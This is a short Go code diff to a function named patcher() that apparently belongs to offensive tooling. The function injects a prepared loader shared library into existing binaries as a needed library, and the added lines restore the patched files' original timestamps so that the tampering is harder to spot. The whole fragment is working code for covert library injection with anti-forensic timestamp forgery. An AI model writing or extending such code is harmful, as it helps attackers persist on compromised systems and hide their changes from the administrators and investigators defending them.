@@ -256,6 +256,7 @@ func patcher() (err error) {
 		if !util.IsFileExist(file) || util.IsFileExist(bak) {
 			continue
 		}
+
 		so_path, err := prepare_loader_so(os.Getpid(), file)
 		if err != nil {
 			return err
@@ -263,6 +264,13 @@ func patcher() (err error) {
 		e := AddNeededLib(file, so_path)
 		if e != nil {
 			err = fmt.Errorf("%v; %v", err, e)
+		}
+
+		// Restore the original file timestamps
+		// ctime is not changed
+		err = RestoreFileTimes(file)
+		if err != nil {
+			return err
 		}
 	}
 	return
